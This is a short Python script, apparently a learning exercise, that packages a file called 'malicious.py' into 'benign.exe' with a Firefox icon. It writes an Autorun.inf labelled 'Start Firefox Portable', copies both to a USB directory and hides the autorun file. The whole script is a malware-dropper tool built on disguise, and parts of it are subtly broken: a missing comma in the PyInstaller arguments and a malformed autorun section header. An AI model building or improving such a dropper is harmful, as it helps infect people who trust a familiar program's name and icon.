import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = "X:"
usbdir = os.path.join(pwd,"USB")
if os.path.isfile(exename):
    os.remove(exename)
print("Creating EXE")     ##Include it for learning purpose
# create executable from Python script
PyInstaller.__main__.run([
    "malicious.py"
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])
print("Exe created")
# clean up after PyInstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist") #Use this to remove directory with all its content (Recursive)
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")  #Use this for, just removing any types of file

print("creating autorun file")

# create AutoRun File
with open("Autorun.inf","w") as o: #Autorun.inf is a file that used to be used to run programs automatically when a USB flash drive was inserted into a computer. However, starting with Windows 7, Microsoft removed this support for security reason
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

print("setting up USB")
    
# Move files to USB and set hidden
shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +h \""+os.path.join(usbdir,"Autorun.inf")+"\"") #This is for hiding the file. Eg, for hiding file named USB as follow: os.system("attrib +h USB")
